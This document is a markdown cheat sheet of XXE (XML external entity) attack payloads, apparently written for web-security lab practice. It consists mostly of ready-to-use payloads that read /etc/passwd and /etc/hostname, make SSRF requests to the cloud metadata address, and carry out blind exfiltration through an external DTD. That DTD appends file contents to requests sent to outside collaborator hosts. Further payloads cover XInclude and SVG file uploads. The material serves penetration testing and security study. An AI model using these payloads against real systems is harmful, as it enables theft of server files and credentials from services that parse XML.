# XXE Payloads
### Normal Method
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  >> For retrieving server files.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>  >> For SSRF attack.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://zhkjg0n2ikpienyuf43fiyvuelkc82wr.oastify.com"> ]>  >> For Blind xxe attack.
&xxe;
```
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead.
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://x0yhzy601i8gxlhsy2md1wesxj3ar2fr.oastify.com"> %xxe; ]>  >> For Blind xxe via XML parameter entities.
```
With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
### Exploiting blind XXE via external DTD server
Host this payload with burp collaborator in external DTD server.
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://uljekvrxmftdii2pjz7amtzpigo7c50u.oastify.com/?x=%file;'>">
%eval;
%exfil;
____________________________________________
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
Now paste the external DTD server link in burpsuite
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://external.dtd.server"> %xxe; ]>
```
### Exploiting XInclude to retrieve files
Use &xxe; (encode & to %26) to parameter value to identify xxe via error message. Then place this payload in value to retrieve file.
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
### Exploiting XXE via image file upload
Change: 
    filename="test.png" to filename="attack.svg" >>
    Content-Type: image/png to Content-Type: image/svg+xml >>
Then put this payload in pixel data.
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
